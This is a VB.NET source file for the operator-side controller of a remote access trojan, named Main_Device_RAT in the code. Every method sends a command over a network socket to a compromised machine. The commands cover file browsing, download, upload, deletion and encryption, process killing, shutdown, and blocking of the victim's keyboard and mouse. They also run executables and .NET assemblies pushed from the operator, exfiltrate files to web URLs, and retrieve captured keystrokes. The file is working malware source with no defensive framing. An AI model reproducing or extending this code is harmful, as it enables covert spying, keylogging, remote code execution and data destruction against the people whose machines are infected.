Imports System.Net.Sockets
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Threading

Public Class Main_Device_RAT
    Public Password As String = "Password"
    Public Writer As IO.BinaryWriter
    Public Reader As IO.BinaryReader
    Public Stream As NetworkStream
    Public Sub GetFoldersAndFiles(ByVal Path As String, ByRef Folders As String, ByRef Files As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Send Directories And Files")
            Writer.Write(Path)
            Writer.Flush()
            Dim j As Integer = Val(Reader.ReadString)
            If j > 0 Then
                Dim directories As String = Reader.ReadString
                For i = 0 To j - 2
                    directories = directories & "<" & Reader.ReadString
                Next
                Folders = directories
            End If
            j = Val(Reader.ReadString)
            If j > 0 Then
                Dim filess As String = Reader.ReadString
                For i = 0 To j - 2
                    filess = filess & "<" & Reader.ReadString
                Next
                Files = filess
            End If
    End Sub
    Public Sub GetFolders(ByVal Path As String, ByRef Folders As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Send Directories")
            Writer.Write(Path)
            Writer.Flush()
            Dim j As Integer = Val(Reader.ReadString)
            If j > 0 Then
                Dim directories As String = Reader.ReadString
                For i = 0 To j - 2
                    directories = directories & "<" & Reader.ReadString
                Next
                Folders = directories
            End If
    End Sub
    Public Function GetImage() As IO.MemoryStream
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Upload Image")
        Dim Count As Long = Reader.ReadInt64
        Dim Bytes() As Byte = Reader.ReadBytes(Count)
        Dim Decompressd() As Byte = Set_Files.Decompress(Bytes)
        Dim Memory As IO.MemoryStream = New IO.MemoryStream(Decompressd)
        GetImage = Memory
    End Function
    Public Sub DeleteDirectory(ByVal Path As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Delete Directory")
            Writer.Write(Path)
            Writer.Flush()
    End Sub
    Public Sub CreateDirectory(ByVal Path As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Create Directory")
            Writer.Write(Path)
            Writer.Flush()
    End Sub
    Public Function GetFileInfo(ByVal Path As String) As String
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Send Fileinfo")
        Writer.Write(Path)
        Writer.Flush()
        Dim Infor As String = Reader.ReadString
        GetFileInfo = Infor
    End Function
    Public Function GetDirectoryInfo(ByVal Path As String) As String
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Send Directoryinfo")
        Writer.Write(Path)
        Writer.Flush()
        Dim Infor As String = Reader.ReadString
        GetDirectoryInfo = Infor
    End Function
    Public Sub EncryptFile(ByVal Path As String, ByVal Password As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Encrypt File")
            Writer.Write(Path)
            Writer.Write(File_Manager.Pass)
            Writer.Flush()
            File_Manager.Pass = ""
            If Reader.ReadBoolean = True Then
                MsgBox("Encrypted")
            Else
                MsgBox("It is not Done")
            End If
    End Sub
    Public Sub DecryptFile(ByVal Path As String, ByVal Password As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Decrypt File")
            Writer.Write(Path)
            Writer.Write(File_Manager.Pass)
            Writer.Flush()
            File_Manager.Pass = ""
            If Reader.ReadBoolean = True Then
                MsgBox("Decrypted")
            Else
                MsgBox("It is not Done")
            End If
    End Sub
    Public Sub Compress(ByVal Path As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Compress File")
            Writer.Write(Path)
            Writer.Flush()
            If Reader.ReadBoolean = True Then
                MsgBox("Compressed")
            Else
                MsgBox("It is not Done")
            End If
    End Sub
    Public Sub Decompress(ByVal Path As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Decompress File")
            Writer.Write(Path)
            Writer.Flush()
            If Reader.ReadBoolean = True Then
                MsgBox("Decompressed")
            Else
                MsgBox("It is not Done")
            End If
    End Sub
    Public Sub CopyFile(ByVal Path As String, ByVal CopyingPath As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Copy File")
            Writer.Write(Path)
            Writer.Write(CopyingPath)
            Writer.Flush()
            Form1.BrowsedDirectory = ""
            If Reader.ReadBoolean = True Then
                MsgBox("Copied")
            Else
                MsgBox("Not Copied")
            End If
    End Sub
    Public Sub MoveFile(ByVal Path As String, ByVal NewPath As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Move File")
            Writer.Write(Path)
            Writer.Write(NewPath)
            Writer.Flush()
            Form1.BrowsedDirectory = ""
            If Reader.ReadBoolean = True Then
                MsgBox("File Moved")
            Else
                MsgBox("File not  Moved")
            End If
    End Sub
    Public Sub SetAttribute(ByVal Path As String, ByVal Attribute As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Set Attribute")
            Writer.Write(Path)
            Writer.Write(Attribute)
            Writer.Flush()
    End Sub
    Public Sub DeleteFile(ByVal File As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Dim Path As String = File_Manager.TextBox2.Text
            Writer.Write("Delete File")
            Writer.Write(File)
            Writer.Flush()
    End Sub
    Public Function GetProcessInfo(ByVal Id As String) As String
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("GetProcessInfo")
        Writer.Write(Id)
        Writer.Flush()
        Dim Info As String = Reader.ReadString
        Return Info
    End Function
    Public Function GetProcesses() As String
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("GetProcesses")
        Writer.Flush()
        Dim I As Integer = Val(Reader.ReadString)
        Dim Processes As String
        If I > 0 Then
            Processes = Reader.ReadString
            For j = 0 To I - 2
                Processes = Processes & "<" & Reader.ReadString
            Next
        Else
            Processes = ""
        End If
        GetProcesses = Processes
    End Function
    Public Sub Kill(ByVal Name As String)
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("Stop Application")
            Writer.Write(Name)
            Writer.Flush()
    End Sub
    Public Function GetDrives() As String
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Send Drives")
        Writer.Flush()
        Dim Drives As String = ""
        Dim Count As Long = Val(Reader.ReadString)
        If Count > 0 Then
            Drives = Reader.ReadString
            For i = 0 To Count - 2
                Drives = Drives & "<" & Reader.ReadString
            Next
        End If
        Return Drives
    End Function
    Public Sub RenameFile(ByVal Path As String, ByVal Name As String)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Rename File")
        Writer.Write(Path)
        Writer.Write(Name)
        Writer.Flush()
        If Reader.ReadBoolean = True Then
            MsgBox("Renamed")
        Else
            MsgBox("Not Renamed")
        End If
    End Sub
    Public Sub MoveDirectory(ByVal Path As String, ByVal NewPath As String)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Move Directory")
        Writer.Write(Path)
        Writer.Write(NewPath)
        Writer.Flush()
        Form1.BrowsedDirectory = ""
        If Reader.ReadBoolean = True Then
            MsgBox("Directory Moved")
        Else
            MsgBox("Directory not  Moved")
        End If
    End Sub
    Public Sub RunExecutableFile(ByVal Path As String)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Run Application")
        Writer.Write(Path)
        Writer.Flush()
    End Sub
    Public Function DownloadFilePart(ByVal File As String, ByVal Start As Long, ByVal Length As Long) As Byte()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("DownloadFilePart")
        Writer.Write(File)
        Writer.Write(Start)
        Writer.Write(Length)
        Writer.Flush()
        Return Reader.ReadBytes(Length)
    End Function
    Public Sub GetClientInfo(ByRef Computername As String, ByRef Username As String, ByRef Process As String)
        Try
            Writer = Form1.Writer
            Reader = Form1.Reader
            Writer.Write("GetClientInfo")
            Writer.Flush()
            Computername = Reader.ReadString
            Username = Reader.ReadString
            Process = Reader.ReadString
        Catch ex As Exception
        End Try
    End Sub
    Public Sub UploadFilePart(ByVal File As String, ByVal Start As Long, ByVal Length As Long, ByVal Data() As Byte)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("UploadFilePart")
        Writer.Write(File)
        Writer.Write(Start)
        Writer.Write(Length)
        Writer.Write(Data)
        Writer.Flush()
    End Sub
    Public Function GetFileSize(ByVal File As String) As Long
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("SendFileSize")
        Writer.Write(File)
        Writer.Flush()
        Return Reader.ReadInt64
    End Function
    Public Sub RestartComputer()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("RestartComputer")
        Writer.Flush()
    End Sub
    Public Sub ShutdownComputer()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("ShutdownComputer")
        Writer.Flush()
    End Sub
    Public Sub LogoffComputer()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("LogoffComputer")
        Writer.Flush()
    End Sub
    Public Sub HibernateComputer()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("HibernateComputer")
        Writer.Flush()
    End Sub
    Public Sub BlockInput()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("BlockInput")
        Writer.Flush()
    End Sub
    Public Sub UnblockInput()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("UnblockInput")
        Writer.Flush()
    End Sub
    Public Sub InvokeAssembly(ByVal Data As Byte())
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("InvokeAssembly")
        Writer.Write(Data.Length)
        Writer.Write(Data)
        Writer.Flush()
    End Sub
    Public Sub InvokeEXE(ByVal Data As Byte())
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("InvokeEXE")
        Writer.Write(Data.Length)
        Writer.Write(Data)
        Writer.Flush()
    End Sub
    Public Sub UploadToWeb(ByVal Url As String, ByVal target As String)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("UploadFileToWeb")
        Writer.Write(target)
        Writer.Write(Url)
        Writer.Flush()
    End Sub
    Public Sub UploadToWeb(ByVal Url As String, ByVal target As String, ByVal Username As String, ByVal Password As String)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("UPUploadFileToWeb")
        Writer.Write(target)
        Writer.Write(Url)
        Writer.Write(Username)
        Writer.Write(Password)
        Writer.Flush()
    End Sub
    Public Sub DownloadFromWeb(ByVal Url As String, ByVal Target As String)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("DownloadFileFromWeb")
        Writer.Write(Url)
        Writer.Write(Target)
        Writer.Flush()
    End Sub
    Public Sub DownloadFromWeb(ByVal Url As String, ByVal Target As String, ByVal Username As String, ByVal Password As String)
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("UPDownloadFileFromWeb")
        Writer.Write(Url)
        Writer.Write(Target)
        Writer.Write(Username)
        Writer.Write(Password)
        Writer.Flush()
    End Sub
    Public Sub Close()
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("Dispose")
        Writer.Flush()
    End Sub
    Public Function GetLastKeys() As String
        Writer = Form1.Writer
        Reader = Form1.Reader
        Writer.Write("SendLastKeys")
        Writer.Flush()
        Dim Inputs As String
        Inputs = Reader.ReadString
        If Inputs = "No Inputs" Then
            Inputs = ""
        End If
        GetLastKeys = Inputs
    End Function
End Class
